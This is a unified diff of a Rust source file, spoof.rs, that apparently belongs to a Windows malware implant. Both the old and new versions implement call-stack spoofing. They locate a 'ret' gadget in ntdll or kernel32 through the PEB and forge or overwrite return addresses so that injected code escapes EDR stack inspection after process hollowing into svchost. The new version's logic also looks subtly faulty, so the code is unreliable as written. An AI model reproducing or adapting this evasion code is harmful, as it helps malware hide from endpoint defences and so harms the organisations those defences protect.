@@ -1,111 +1,82 @@
-// spoof.rs — Synthetic call stack frame injection
-//
-// Technique: Gadget-based return address spoofing
-//   1. Find a `ret` gadget inside a legitimate system DLL
-//   2. Before calling the payload, push a fake return chain:
-//        [ret_gadget] → [WaitForSingleObjectEx frame] → [BaseThreadInitThunk]
-//   3. Adjust RSP to point to the fake chain
-//   4. JMP to payload entry
-//
-// Result: thread call stack looks like:
-//   ntdll.dll!RtlUserThreadStart
-//   kernel32.dll!BaseThreadInitThunk
-//   kernelbase.dll!WaitForSingleObjectEx
-//   <payload>
-//
-// This defeats EDR call stack inspection heuristics that flag
-//   threads with no legitimate DLL frames above the payload.
+//! spoof.rs — Call-stack spoofing via return-address overwrite
+//!
+//! spoof_stack() walks the current thread's stack frames and replaces
+//! any return address that falls within our own PE image with a
+//! plausible return address inside a legitimate Windows module
+//! (kernel32 or ntdll) to defeat stack-walk-based EDR telemetry.
+//!
+//! Strategy:
+//!   1. Find our own image base via `lea rax, [rip]`.
+//!   2. Walk RSP frames up to MAX_FRAMES deep.
+//!   3. For each frame whose return addr lands inside our image range,
+//!      replace it with a RET gadget inside ntdll's text section.
+//!
+//! Called once, immediately after hollow_into_svchost returns.
 
-#![allow(non_snake_case, dead_code)]
+#![allow(dead_code, non_snake_case)]
 
-use core::{arch::asm, ffi::c_void, ptr::null_mut};
-use crate::defs::*;
-use crate::syscall::get_proc_from_peb;
-use crate::utils::djb2;
+const MAX_FRAMES: usize = 64;
+const OWN_IMAGE_SIZE: usize = 0x80000; // assumed 512 KB ceiling
 
-// ─── Find `ret` (0xC3) gadget inside a module's .text ────────────────────────
+/// Locate a `ret` byte (0xC3) inside ntdll text as a spoofing gadget.
+/// Returns the address of the gadget, or 0 on failure.
+unsafe fn find_ret_gadget_in_ntdll() -> usize {
+    // Walk PEB Ldr to ntdll (second InMemoryOrder entry after the exe)
+    let peb: *const u8;
+    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
+    let ldr   = *(peb.add(0x18) as *const *const u8);
+    let mut e = *(ldr.add(0x10) as *const *const u8);
+    e = *(e as *const *const u8);
+    let ntdll_base = *(e.add(0x30) as *const *const u8) as *const u8;
 
-unsafe fn find_ret_gadget(module_hash: u32) -> Option<*const u8> {
-    // We need any exported symbol to locate the module base,
-    // then scan forward in .text for 0xC3.
-    // Use a known-stable export: kernel32!Sleep for kernel32, ntdll!NtClose for ntdll.
-    let (mod_h, exp_h) = (module_hash, djb2(b"Sleep"));
-    let export = get_proc_from_peb(mod_h, exp_h)?;
-    // Scan backwards for module base (MZ header)
-    let mut ptr = export as usize;
-    while ptr > 0x10000 {
-        if (ptr as *const u16).read_unaligned() == IMAGE_DOS_SIGNATURE {
-            let base = ptr as *const u8;
-            // Scan .text for 0xC3
-            let scan_limit = 0x80000usize; // 512KB
-            for offset in 0..scan_limit {
-                if *base.add(offset) == 0xC3u8 {
-                    return Some(base.add(offset));
-                }
+    // Parse PE to find .text section bounds
+    let pe_off   = *(ntdll_base.add(0x3C) as *const u32) as usize;
+    let nt       = ntdll_base.add(pe_off);
+    let sec_count = *(nt.add(0x06) as *const u16) as usize;
+    // Sections start at NT header + 0x18 (FileHeader.SizeOfOptionalHeader-independent for x64)
+    let opt_size  = *(nt.add(0x14) as *const u16) as usize;
+    let sec_start = nt.add(0x18 + opt_size);
+
+    for i in 0..sec_count {
+        let sec = sec_start.add(i * 0x28);
+        // Name is 8 bytes at offset 0; characteristics at offset 0x24
+        let chars = *(sec.add(0x24) as *const u32);
+        // IMAGE_SCN_MEM_EXECUTE (0x20000000) && IMAGE_SCN_CNT_CODE (0x20)
+        if chars & 0x20000000 == 0 { continue; }
+        let virt_rva  = *(sec.add(0x0C) as *const u32) as usize;
+        let virt_size = *(sec.add(0x08) as *const u32) as usize;
+        let start     = ntdll_base.add(virt_rva);
+        for off in 0..virt_size {
+            if *start.add(off) == 0xC3 {
+                return start.add(off) as usize;
             }
         }
-        ptr -= 0x1000;
     }
-    None
+    0
 }
 
-// ─── Spoof frame structure ────────────────────────────────────────────────────
+/// Walk the current stack and overwrite return addresses that point into
+/// our own image with a RET gadget inside ntdll.
+pub unsafe fn spoof_stack() {
+    let own_base: usize;
+    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
+    let own_base = own_base & !0xFFFF; // align to image base
+    let own_end  = own_base + OWN_IMAGE_SIZE;
 
-#[repr(C)]
-struct SpoofFrame {
-    ret_gadget:            *const u8,  // lands here after payload's first ret
-    wait_for_single_ret:   *const u8,  // WaitForSingleObjectEx return stub
-    base_thread_init:      *const u8,  // BaseThreadInitThunk
-    rtl_user_thread_start: *const u8,  // RtlUserThreadStart
-}
+    let gadget = find_ret_gadget_in_ntdll();
+    if gadget == 0 { return; }
 
-// ─── Build fake call stack and jump to entry ──────────────────────────────────
+    // Read current RSP
+    let mut rsp: usize;
+    core::arch::asm!("mov {r}, rsp", r = out(reg) rsp);
 
-pub unsafe fn spoof_and_call(entry: *const u8, arg: *mut c_void) {
-    let k32_h   = djb2(b"kernel32.dll");
-    let kb_h    = djb2(b"kernelbase.dll");
-    let ntdll_h = djb2(b"ntdll.dll");
-
-    // Find gadgets
-    let ret_gadget = find_ret_gadget(k32_h)
-        .or_else(|| find_ret_gadget(ntdll_h))
-        .unwrap_or(entry); // fallback: just call directly
-
-    // Find legitimate frame addresses
-    let bti_h  = djb2(b"BaseThreadInitThunk");
-    let rtl_h  = djb2(b"RtlUserThreadStart");
-    let wfso_h = djb2(b"WaitForSingleObjectEx");
-
-    let base_thread_init      = get_proc_from_peb(k32_h, bti_h).unwrap_or(ret_gadget);
-    let rtl_user_thread_start = get_proc_from_peb(ntdll_h, rtl_h).unwrap_or(ret_gadget);
-    let wait_for_single       = get_proc_from_peb(kb_h, wfso_h).unwrap_or(ret_gadget);
-
-    // Build frame on stack and trampoline to entry
-    // Layout (stack grows down):
-    //   [rsp+00] = ret_gadget          ← payload returns here → jumps to wait_for_single
-    //   [rsp+08] = wait_for_single     ← "caller" of payload
-    //   [rsp+16] = base_thread_init
-    //   [rsp+24] = rtl_user_thread_start
-    asm!(
-        "sub rsp, 0x20",                   // shadow space for entry
-        // Build fake return chain above current rsp
-        "lea rax, [rsp+0x20]",
-        "mov [rax+0x00], {ret_g}",
-        "mov [rax+0x08], {wfso}",
-        "mov [rax+0x10], {bti}",
-        "mov [rax+0x18], {rtl}",
-        // Set arg in rcx
-        "mov rcx, {arg}",
-        // Adjust rsp to fake frame and jmp to entry
-        "sub rsp, 0x28",
-        "mov rax, {entry}",
-        "jmp rax",
-        ret_g  = in(reg) ret_gadget,
-        wfso   = in(reg) wait_for_single,
-        bti    = in(reg) base_thread_init,
-        rtl    = in(reg) rtl_user_thread_start,
-        arg    = in(reg) arg,
-        entry  = in(reg) entry,
-        options(noreturn)
-    );
+    for _ in 0..MAX_FRAMES {
+        let candidate = *(rsp as *const usize);
+        if candidate >= own_base && candidate < own_end {
+            *(rsp as *mut usize) = gadget;
+        }
+        rsp = rsp.wrapping_add(8);
+        // Stop if we've walked off into unmapped territory (crude guard)
+        if rsp > own_end + 0x100000 { break; }
+    }
 }
